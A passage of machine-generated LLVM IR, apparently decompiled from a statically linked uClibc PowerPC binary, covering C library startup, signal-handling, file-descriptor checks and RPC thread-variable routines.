  %v2_1000f3fc = add i32 %v2_1000f40841, 8
  %v3_1000f3fc = inttoptr i32 %v2_1000f3fc to i32*
  store i32 %v0_1000f3fc.pre, i32* %v3_1000f3fc, align 4
  %v0_1000f400 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f400 = add i32 %v0_1000f400, -1
  store i32 %v1_1000f400, i32* %r11.global-to-local, align 4
  %v1_1000f404 = mul i32 %v1_1000f400, 4
  %v1_1000f408 = load i32, i32* @r8, align 4
  %v2_1000f408 = add i32 %v1_1000f408, %v1_1000f404
  %v0_1000f40c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f40c = add i32 %v0_1000f40c, -1
  store i32 %v1_1000f40c, i32* %ctr.global-to-local, align 4
  %v2_1000f40c = icmp eq i32 %v1_1000f40c, 0
  br i1 %v2_1000f40c, label %dec_label_pc_1000f410, label %dec_label_pc_1000f3fc.dec_label_pc_1000f3fc_crit_edge

dec_label_pc_1000f410:                            ; preds = %dec_label_pc_1000f3fc.dec_label_pc_1000f3fc_crit_edge, %dec_label_pc_1000f3fc.lr.ph
  store i32 %v2_1000f390, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000f418 = call i32 @__sigaddset()
  store i32 %v0_1000f418, i32* %r3.global-to-local, align 4
  %v1_1000f41c = icmp slt i32 %v0_1000f418, 0
  br i1 %v1_1000f41c, label %dec_label_pc_1000f508, label %dec_label_pc_1000f424

dec_label_pc_1000f424:                            ; preds = %dec_label_pc_1000f410
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000f42c = ptrtoint i32* %stack_var_-176 to i32
  store i32 268497972, i32* @lr, align 4
  %v4_1000f430 = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_1000f42c)
  store i32 %v4_1000f430, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_1000f430, -1
  br i1 %tmp30, label %dec_label_pc_1000f464, label %dec_label_pc_1000f43c

dec_label_pc_1000f43c:                            ; preds = %dec_label_pc_1000f424
  %v0_1000f43c = call i32 @__errno_location()
  store i32 %v0_1000f43c, i32* %r3.global-to-local, align 4
  %v1_1000f444 = inttoptr i32 %v0_1000f43c to i32*
  %v2_1000f444 = load i32, i32* %v1_1000f444, align 4
  store i32 %v0_1000f43c, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268498008, i32* @lr, align 4
  %v3_1000f454 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000f3b4, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1000f45c = inttoptr i32 %v0_1000f43c to i32*
  store i32 %v2_1000f444, i32* %v2_1000f45c, align 4
  %v0_1000f51c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f50c

dec_label_pc_1000f464:                            ; preds = %dec_label_pc_1000f424
  %v3_1000f464 = load i32, i32* %stack_var_-176, align 4
  %v3_1000f470 = icmp eq i32 %v3_1000f464, 1
  br i1 %v3_1000f470, label %dec_label_pc_1000f478, label %dec_label_pc_1000f4ac

dec_label_pc_1000f478:                            ; preds = %dec_label_pc_1000f464
  store i32 %v2_1000f370, i32* %r3.global-to-local, align 4
  store i32 268498052, i32* @lr, align 4
  %v2_1000f480 = call i32 @nanosleep(i32 %v2_1000f370, i32 %v2_1000f370)
  store i32 %v2_1000f480, i32* %r3.global-to-local, align 4
  store i32 %v2_1000f480, i32* @r31, align 4
  %v0_1000f488 = call i32 @__errno_location()
  store i32 %v0_1000f488, i32* %r3.global-to-local, align 4
  store i32 %v0_1000f488, i32* %r29.global-to-local, align 4
  %v1_1000f498 = inttoptr i32 %v0_1000f488 to i32*
  %v2_1000f498 = load i32, i32* %v1_1000f498, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268498084, i32* @lr, align 4
  %v3_1000f4a0 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000f3b4, i32 0)
  store i32 %v3_1000f4a0, i32* %r3.global-to-local, align 4
  %v1_1000f4a4 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000f4a4 = inttoptr i32 %v1_1000f4a4 to i32*
  store i32 %v2_1000f498, i32* %v2_1000f4a4, align 4
  %v0_1000f4d4.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000f4d4

dec_label_pc_1000f4ac:                            ; preds = %dec_label_pc_1000f464
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268498108, i32* @lr, align 4
  %v3_1000f4b8 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000f3b4, i32 0)
  br label %dec_label_pc_1000f4c8

dec_label_pc_1000f4c8:                            ; preds = %dec_label_pc_1000f3d0, %dec_label_pc_1000f4ac
  store i32 %v2_1000f370, i32* %r3.global-to-local, align 4
  store i32 268498128, i32* @lr, align 4
  %v2_1000f4cc = call i32 @nanosleep(i32 %v2_1000f370, i32 %v2_1000f370)
  store i32 %v2_1000f4cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f4d4

dec_label_pc_1000f4d4:                            ; preds = %dec_label_pc_1000f478, %dec_label_pc_1000f4c8
  %v0_1000f4d4 = phi i32 [ %v0_1000f4d4.pr, %dec_label_pc_1000f478 ], [ %v2_1000f4cc, %dec_label_pc_1000f4c8 ]
  %v3_1000f4d4 = icmp eq i32 %v0_1000f4d4, 0
  br i1 %v3_1000f4d4, label %dec_label_pc_1000f500, label %dec_label_pc_1000f4dc

dec_label_pc_1000f4dc:                            ; preds = %dec_label_pc_1000f4d4
  %v3_1000f4ec = load i32, i32* %stack_var_-440, align 4
  %v0_1000f4f0 = call i32 @__asm_mfcr()
  store i32 %v0_1000f4f0, i32* %r3.global-to-local, align 4
  %v1_1000f4f4 = call i32 @__asm_rlwinm(i32 %v0_1000f4f0, i32 30, i32 31, i32 31)
  %v2_1000f4f8 = add i32 %v3_1000f4ec, %v1_1000f4f4
  store i32 %v2_1000f4f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f50c

dec_label_pc_1000f500:                            ; preds = %dec_label_pc_1000f4d4, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f50c

dec_label_pc_1000f508:                            ; preds = %dec_label_pc_1000f3b4, %dec_label_pc_1000f410, %dec_label_pc_1000f390
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f50c

dec_label_pc_1000f50c:                            ; preds = %dec_label_pc_1000f500, %dec_label_pc_1000f4dc, %dec_label_pc_1000f43c, %dec_label_pc_1000f508
  %v0_1000f51c = phi i32 [ 0, %dec_label_pc_1000f500 ], [ %v2_1000f4f8, %dec_label_pc_1000f4dc ], [ %v0_1000f51c.pre, %dec_label_pc_1000f43c ], [ -1, %dec_label_pc_1000f508 ]
  ret i32 %v0_1000f51c

; uselistorder directives
  uselistorder i32 %v1_1000f40c, { 1, 0 }
  uselistorder i32 %v2_1000f3b4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1000f38c, { 1, 0 }
  uselistorder i32 %v2_1000f370, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 0, 7, 22, 8, 9, 10, 21, 11, 12, 14, 15, 13, 16, 2, 17, 18, 3, 19, 20, 23, 1 }
  uselistorder i32* %r11.global-to-local, { 3, 2, 0, 8, 9, 5, 4, 1, 6, 7 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 8, 9, 5, 4, 1, 6, 7 }
  uselistorder i32 (i32, i32)* @nanosleep, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f50c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000f508, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f4d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f4c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f3fc.dec_label_pc_1000f3fc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000f37c.dec_label_pc_1000f37c_crit_edge, { 1, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1002f068.453 to i32)
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000f57c:
  %v3_1000f580 = load i32, i32* @global_var_1002f078.455, align 4
  %v3_1000f584 = icmp eq i32 %v3_1000f580, 0
  br i1 %v3_1000f584, label %dec_label_pc_1000f594, label %dec_label_pc_1000f58c

dec_label_pc_1000f58c:                            ; preds = %dec_label_pc_1000f57c
  %v1_1000f590 = call i32 @unknown_0()
  store i32 %v1_1000f590, i32* @r3, align 4
  br label %dec_label_pc_1000f594

dec_label_pc_1000f594:                            ; preds = %dec_label_pc_1000f57c, %dec_label_pc_1000f58c
  %v3_1000f598 = load i32, i32* @global_var_1002f07c.456, align 4
  %v3_1000f59c = icmp eq i32 %v3_1000f598, 0
  br i1 %v3_1000f59c, label %dec_label_pc_1000f594.dec_label_pc_1000f5ac_crit_edge, label %dec_label_pc_1000f5a4

dec_label_pc_1000f594.dec_label_pc_1000f5ac_crit_edge: ; preds = %dec_label_pc_1000f594
  %v0_1000f5bc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000f5ac

dec_label_pc_1000f5a4:                            ; preds = %dec_label_pc_1000f594
  %v1_1000f5a8 = call i32 @unknown_0()
  br label %dec_label_pc_1000f5ac

dec_label_pc_1000f5ac:                            ; preds = %dec_label_pc_1000f594.dec_label_pc_1000f5ac_crit_edge, %dec_label_pc_1000f5a4
  %v0_1000f5bc = phi i32 [ %v0_1000f5bc.pre, %dec_label_pc_1000f594.dec_label_pc_1000f5ac_crit_edge ], [ %v1_1000f5a8, %dec_label_pc_1000f5a4 ]
  ret i32 %v0_1000f5bc

; uselistorder directives
  uselistorder i32 ()* @unknown_0, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1000f5ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000f594, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_1000f5c8 = load i32, i32* @r3, align 4
  ret i32 %v0_1000f5c8
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268498416, i32* @lr, align 4
  %v2_1000f5ec = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_1000f5f0 = icmp eq i32 %v2_1000f5ec, -1
  br i1 %v3_1000f5f0, label %dec_label_pc_1000f5f8, label %dec_label_pc_1000f618

dec_label_pc_1000f5f8:                            ; preds = %entry
  %v0_1000f5fc = load i32, i32* @r30, align 4
  store i32 %v0_1000f5fc, i32* @r4, align 4
  store i32 268498444, i32* @lr, align 4
  %v0_1000f608 = call i32 @__libc_open()
  %v1_1000f60c = load i32, i32* @r31, align 4
  %v4_1000f60c = icmp eq i32 %v0_1000f608, %v1_1000f60c
  br i1 %v4_1000f60c, label %dec_label_pc_1000f618, label %dec_label_pc_1000f614

dec_label_pc_1000f614:                            ; preds = %dec_label_pc_1000f5f8
  %v1_1000f614 = call i32 @abort(i32 %v0_1000f608)
  br label %dec_label_pc_1000f618

dec_label_pc_1000f618:                            ; preds = %entry, %dec_label_pc_1000f5f8, %dec_label_pc_1000f614
  %v0_1000f628 = phi i32 [ %v2_1000f5ec, %entry ], [ %v0_1000f608, %dec_label_pc_1000f5f8 ], [ %v1_1000f614, %dec_label_pc_1000f614 ]
  ret i32 %v0_1000f628

; uselistorder directives
  uselistorder i32 ()* @__libc_open, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_1000f618, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000f62c = load i32, i32* @lr, align 4
  %v3_1000f64c = load i32, i32* @global_var_1002f080.458, align 4
  %v3_1000f650 = icmp eq i32 %v3_1000f64c, 0
  br i1 %v3_1000f650, label %dec_label_pc_1000f674, label %entry.dec_label_pc_1000f698_crit_edge

entry.dec_label_pc_1000f698_crit_edge:            ; preds = %entry
  %v0_1000f6a8.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000f698

dec_label_pc_1000f674:                            ; preds = %entry
  store i32 1, i32* @global_var_1002f080.458, align 4
  store i32 4096, i32* @global_var_1002f074.241, align 4
  store i32 268498548, i32* @lr, align 4
  %v1_1000f670 = call i32 @__pthread_initialize_minimal(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  br i1 icmp eq (i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -18596), i32 0), label %dec_label_pc_1000f698, label %dec_label_pc_1000f684

dec_label_pc_1000f684:                            ; preds = %dec_label_pc_1000f674
  store i32 %v0_1000f62c, i32* @lr, align 4
  %v1_1000f694 = call i32 @_stdio_init(i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -18596))
  br label %dec_label_pc_1000f698

dec_label_pc_1000f698:                            ; preds = %entry.dec_label_pc_1000f698_crit_edge, %dec_label_pc_1000f674, %dec_label_pc_1000f684
  %v0_1000f6a8 = phi i32 [ %v0_1000f6a8.pre, %entry.dec_label_pc_1000f698_crit_edge ], [ %v1_1000f670, %dec_label_pc_1000f674 ], [ %v1_1000f694, %dec_label_pc_1000f684 ]
  ret i32 %v0_1000f6a8

; uselistorder directives
  uselistorder label %dec_label_pc_1000f698, { 2, 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1000f6c4 = mul i32 %arg2, 4
  %v2_1000f6c8 = add i32 %tmp, %v1_1000f6c4
  %v0_1000f6cc = load i32, i32* @r9, align 4
  store i32 %v0_1000f6cc, i32* @global_var_1002f06c.459, align 4
  %v1_1000f6d0 = add i32 %v2_1000f6c8, 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_1000f6d0, i32* @global_var_1002f070.452, align 4
  store i32 %arg6, i32* @global_var_1002f07c.456, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_1000f6f0 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_1000f6f8 = icmp eq i32 %v1_1000f6d0, %v2_1000f6f0
  br i1 %v4_1000f6f8, label %dec_label_pc_1000f700, label %dec_label_pc_1000f704

dec_label_pc_1000f700:                            ; preds = %entry
  store i32 %v2_1000f6c8, i32* @global_var_1002f070.452, align 4
  br label %dec_label_pc_1000f704

dec_label_pc_1000f704:                            ; preds = %entry, %dec_label_pc_1000f700
  %v2_1000f704 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268498708, i32* @lr, align 4
  %v3_1000f710 = call i32 @__GI_memset(i32 %v2_1000f704, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1002f070.452, align 4
  br label %dec_label_pc_1000f720

dec_label_pc_1000f720:                            ; preds = %dec_label_pc_1000f720, %dec_label_pc_1000f704
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_1000f704 ], [ %v1_1000f724, %dec_label_pc_1000f720 ]
  %v1_1000f720 = inttoptr i32 %storemerge to i32*
  %v2_1000f720 = load i32, i32* %v1_1000f720, align 4
  %v1_1000f724 = add i32 %storemerge, 4
  %v3_1000f728 = icmp eq i32 %v2_1000f720, 0
  br i1 %v3_1000f728, label %dec_label_pc_1000f730, label %dec_label_pc_1000f720

dec_label_pc_1000f730:                            ; preds = %dec_label_pc_1000f720
  store i32 %v1_1000f724, i32* %r29.global-to-local, align 4
  %v1_1000f75c12 = inttoptr i32 %v1_1000f724 to i32*
  %v2_1000f75c13 = load i32, i32* %v1_1000f75c12, align 4
  %v3_1000f76016 = icmp eq i32 %v2_1000f75c13, 0
  br i1 %v3_1000f76016, label %dec_label_pc_1000f768, label %dec_label_pc_1000f738

dec_label_pc_1000f738:                            ; preds = %dec_label_pc_1000f730, %dec_label_pc_1000f758
  %v0_1000f74c = phi i32 [ %v1_1000f758, %dec_label_pc_1000f758 ], [ %v1_1000f724, %dec_label_pc_1000f730 ]
  %v0_1000f740 = phi i32 [ %v2_1000f75c, %dec_label_pc_1000f758 ], [ %v2_1000f75c13, %dec_label_pc_1000f730 ]
  %v2_1000f738 = icmp ugt i32 %v0_1000f740, 14
  br i1 %v2_1000f738, label %dec_label_pc_1000f758, label %dec_label_pc_1000f740

dec_label_pc_1000f740:                            ; preds = %dec_label_pc_1000f738
  %v1_1000f740 = mul i32 %v0_1000f740, 8
  %v2_1000f748 = add i32 %v1_1000f740, %v2_1000f704
  store i32 %v2_1000f748, i32* @r3, align 4
  store i32 %v0_1000f74c, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268498776, i32* @lr, align 4
  %v0_1000f754 = call i32 @memcpy()
  %v0_1000f758.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f758

dec_label_pc_1000f758:                            ; preds = %dec_label_pc_1000f738, %dec_label_pc_1000f740
  %v0_1000f758 = phi i32 [ %v0_1000f74c, %dec_label_pc_1000f738 ], [ %v0_1000f758.pre, %dec_label_pc_1000f740 ]
  %v1_1000f758 = add i32 %v0_1000f758, 8
  store i32 %v1_1000f758, i32* %r29.global-to-local, align 4
  %v1_1000f75c = inttoptr i32 %v1_1000f758 to i32*
  %v2_1000f75c = load i32, i32* %v1_1000f75c, align 4
  %v3_1000f760 = icmp eq i32 %v2_1000f75c, 0
  br i1 %v3_1000f760, label %dec_label_pc_1000f768, label %dec_label_pc_1000f738

dec_label_pc_1000f768:                            ; preds = %dec_label_pc_1000f758, %dec_label_pc_1000f730
  %v1_1000f76c = call i32 @_dl_aux_init(i32 %v2_1000f704)
  store i32 %v1_1000f76c, i32* @r3, align 4
  store i32 268498804, i32* @lr, align 4
  %v1_1000f770 = call i32 @__GI___uClibc_init(i32 %v1_1000f76c)
  %v3_1000f778 = icmp eq i32 %tmp27, 0
  br i1 %v3_1000f778, label %dec_label_pc_1000f780, label %dec_label_pc_1000f784

dec_label_pc_1000f780:                            ; preds = %dec_label_pc_1000f768
  br label %dec_label_pc_1000f784

dec_label_pc_1000f784:                            ; preds = %dec_label_pc_1000f768, %dec_label_pc_1000f780
  %v0_1000f78c = phi i32 [ %tmp27, %dec_label_pc_1000f768 ], [ 4096, %dec_label_pc_1000f780 ]
  store i32 %v0_1000f78c, i32* @global_var_1002f074.241, align 4
  %v3_1000f790 = icmp eq i32 %tmp26, -1
  br i1 %v3_1000f790, label %dec_label_pc_1000f798, label %dec_label_pc_1000f7cc

dec_label_pc_1000f798:                            ; preds = %dec_label_pc_1000f784
  store i32 268498844, i32* @lr, align 4
  %v1_1000f798 = call i32 @getuid(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v1_1000f798, i32* %r29.global-to-local, align 4
  store i32 268498852, i32* @lr, align 4
  %v0_1000f7a0 = call i32 @geteuid()
  %v4_1000f7a4 = icmp eq i32 %v1_1000f798, %v0_1000f7a0
  br i1 %v4_1000f7a4, label %dec_label_pc_1000f7ac, label %dec_label_pc_1000f7e8

dec_label_pc_1000f7ac:                            ; preds = %dec_label_pc_1000f798
  store i32 268498864, i32* @lr, align 4
  %v1_1000f7ac = call i32 @getgid(i32 %v0_1000f7a0)
  store i32 %v1_1000f7ac, i32* %r29.global-to-local, align 4
  store i32 268498872, i32* @lr, align 4
  %v0_1000f7b4 = call i32 @getegid()
  %v4_1000f7b8 = icmp eq i32 %v1_1000f7ac, %v0_1000f7b4
  br i1 %v4_1000f7b8, label %dec_label_pc_1000f7c0.thread, label %dec_label_pc_1000f7e8

dec_label_pc_1000f7c0.thread:                     ; preds = %dec_label_pc_1000f7ac
  br label %dec_label_pc_1000f818

dec_label_pc_1000f7cc:                            ; preds = %dec_label_pc_1000f784
  %v4_1000f7d0 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_1000f7d0, label %dec_label_pc_1000f7d8, label %dec_label_pc_1000f7e8

dec_label_pc_1000f7d8:                            ; preds = %dec_label_pc_1000f7cc
  br label %dec_label_pc_1000f7e8

dec_label_pc_1000f7e8:                            ; preds = %dec_label_pc_1000f7d8, %dec_label_pc_1000f7cc, %dec_label_pc_1000f7ac, %dec_label_pc_1000f798
  store i32 268498936, i32* @lr, align 4
  %v2_1000f7f4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268498952, i32* @lr, align 4
  %v2_1000f804 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268498968, i32* @lr, align 4
  %v2_1000f814 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_1000f818

dec_label_pc_1000f818:                            ; preds = %dec_label_pc_1000f7c0.thread, %dec_label_pc_1000f7e8
  %v0_1000f824 = load i32, i32* @r30, align 4
  %v1_1000f824 = inttoptr i32 %v0_1000f824 to i32*
  %v2_1000f824 = load i32, i32* %v1_1000f824, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_1000f824, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -4188) to i32*), align 4
  %v0_1000f844 = load i32, i32* @r27, align 4
  store i32 %v0_1000f844, i32* @global_var_1002f078.455, align 4
  br i1 false, label %dec_label_pc_1000f84c, label %dec_label_pc_1000f8c4

dec_label_pc_1000f84c:                            ; preds = %dec_label_pc_1000f818, %dec_label_pc_1000f84c
  br i1 undef, label %dec_label_pc_1000f84c, label %dec_label_pc_1000f8c4

dec_label_pc_1000f8c4:                            ; preds = %dec_label_pc_1000f84c, %dec_label_pc_1000f818
  %v0_1000f870 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_1000f870)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000f8d4 = call i32 @__errno_location()
  %v2_1000f8dc = inttoptr i32 %v0_1000f8d4 to i32*
  store i32 0, i32* %v2_1000f8dc, align 4
  %v1_1000f8f0 = call i32 @__h_errno_location(i32 268453880)
  %v2_1000f8f8 = inttoptr i32 %v1_1000f8f0 to i32*
  store i32 0, i32* %v2_1000f8f8, align 4
  %v0_1000f908 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_1000f908)
  %v0_1000f914 = call i32 @__GI_exit()
  ret i32 %v0_1000f914

; uselistorder directives
  uselistorder i32 %v2_1000f75c, { 1, 0 }
  uselistorder i32 %v1_1000f758, { 2, 1, 0 }
  uselistorder i32 %v1_1000f724, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_1000f704, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000f84c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f818, { 1, 0 }
  uselistorder label %dec_label_pc_1000f784, { 1, 0 }
  uselistorder label %dec_label_pc_1000f758, { 1, 0 }
  uselistorder label %dec_label_pc_1000f738, { 1, 0 }
  uselistorder label %dec_label_pc_1000f704, { 1, 0 }
}

define i32 @rpc_thread_multi(i32 %arg1) local_unnamed_addr {
entry:
  br i1 icmp eq (i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27004), i32 0), label %dec_label_pc_1000f948, label %dec_label_pc_1000f940

dec_label_pc_1000f940:                            ; preds = %entry
  %v3_1000f940 = call i32 @__pthread_internal_tsd_set(i32 2, i32 ptrtoint (i32* @global_var_10033854.462 to i32), i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  br label %dec_label_pc_1000f950

dec_label_pc_1000f948:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10033854.462 to i32), i32* @global_var_1002f088.464, align 4
  br label %dec_label_pc_1000f950

dec_label_pc_1000f950:                            ; preds = %dec_label_pc_1000f940, %dec_label_pc_1000f948
  %v0_1000f95c = phi i32 [ %v3_1000f940, %dec_label_pc_1000f940 ], [ 2, %dec_label_pc_1000f948 ]
  ret i32 %v0_1000f95c

; uselistorder directives
  uselistorder label %dec_label_pc_1000f950, { 1, 0 }
}

define i32 @__rpc_thread_variables() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27020), i32 0), label %dec_label_pc_1000f98c, label %dec_label_pc_1000f980

dec_label_pc_1000f980:                            ; preds = %entry
  %v2_1000f984 = call i32 @__pthread_internal_tsd_get(i32 2, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27020))
  br label %dec_label_pc_1000f994

dec_label_pc_1000f98c:                            ; preds = %entry
  %v3_1000f990 = load i32, i32* @global_var_1002f088.464, align 4
  br label %dec_label_pc_1000f994

dec_label_pc_1000f994:                            ; preds = %dec_label_pc_1000f980, %dec_label_pc_1000f98c
  %storemerge = phi i32 [ %v2_1000f984, %dec_label_pc_1000f980 ], [ %v3_1000f990, %dec_label_pc_1000f98c ]
  %v3_1000f994 = icmp eq i32 %storemerge, 0
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br i1 %v3_1000f994, label %dec_label_pc_1000f9a0, label %dec_label_pc_1000fa78

dec_label_pc_1000f9a0:                            ; preds = %dec_label_pc_1000f994
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r31.global-to-local, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -31968), i32 0), label %dec_label_pc_1000f9c8, label %dec_label_pc_1000f9b4

dec_label_pc_1000f9b4:                            ; preds = %dec_label_pc_1000f9a0
  store i32 ptrtoint (i32* @global_var_1000f9c4.467 to i32), i32* @lr, align 4
  %v4_1000f9c0 = call i32 @pthread_once(i32* nonnull @global_var_1002f084.466, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -1768), i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -31968))
  br label %dec_label_pc_1000f9e0

dec_label_pc_1000f9c8:                            ; preds = %dec_label_pc_1000f9a0
  %v3_1000f9c8 = load i32, i32* @global_var_1002f084.466, align 4
  %v3_1000f9cc = icmp eq i32 %v3_1000f9c8, 0
  br i1 %v3_1000f9cc, label %dec_label_pc_1000f9d4, label %dec_label_pc_1000f9e0

dec_label_pc_1000f9d4:                            ; preds = %dec_label_pc_1000f9c8
  store i32 ptrtoint (i32* @global_var_1000f9d8.468 to i32), i32* @lr, align 4
  %v1_1000f9d4 = call i32 @rpc_thread_multi(i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -31968))
  store i32 1, i32* @global_var_1002f084.466, align 4
  br label %dec_label_pc_1000f9e0

dec_label_pc_1000f9e0:                            ; preds = %dec_label_pc_1000f9c8, %dec_label_pc_1000f9b4, %dec_label_pc_1000f9d4
  br i1 icmp eq (i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27020), i32 0), label %dec_label_pc_1000f9fc, label %dec_label_pc_1000f9f0

dec_label_pc_1000f9f0:                            ; preds = %dec_label_pc_1000f9e0
  %v2_1000f9f4 = call i32 @__pthread_internal_tsd_get(i32 2, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27020))
  br label %dec_label_pc_1000fa04

dec_label_pc_1000f9fc:                            ; preds = %dec_label_pc_1000f9e0
  %v3_1000fa00 = load i32, i32* @global_var_1002f088.464, align 4
  br label %dec_label_pc_1000fa04

dec_label_pc_1000fa04:                            ; preds = %dec_label_pc_1000f9f0, %dec_label_pc_1000f9fc
  %storemerge1 = phi i32 [ %v2_1000f9f4, %dec_label_pc_1000f9f0 ], [ %v3_1000fa00, %dec_label_pc_1000f9fc ]
  %v3_1000fa04 = icmp eq i32 %storemerge1, 0
  store i32 %storemerge1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fa04, label %dec_label_pc_1000fa10, label %dec_label_pc_1000fa78

dec_label_pc_1000fa10:                            ; preds = %dec_label_pc_1000fa04
  store i32 268499484, i32* @lr, align 4
  %v2_1000fa18 = call i32 @calloc(i32 1, i32 200)
  store i32 %v2_1000fa18, i32* %r31.global-to-local, align 4
  %v3_1000fa1c = icmp eq i32 %v2_1000fa18, 0
  br i1 %v3_1000fa1c, label %dec_label_pc_1000fa50, label %dec_label_pc_1000fa24

dec_label_pc_1000fa24:                            ; preds = %dec_label_pc_1000fa10
  br i1 icmp eq (i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27004), i32 0), label %dec_label_pc_1000fa44, label %dec_label_pc_1000fa34

dec_label_pc_1000fa34:                            ; preds = %dec_label_pc_1000fa24
  %v3_1000fa3c = call i32 @__pthread_internal_tsd_set(i32 2, i32 %v2_1000fa18, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27004))
  %v0_1000fa7c.pre = load i32, i32* %r31.global-to-local, align 4
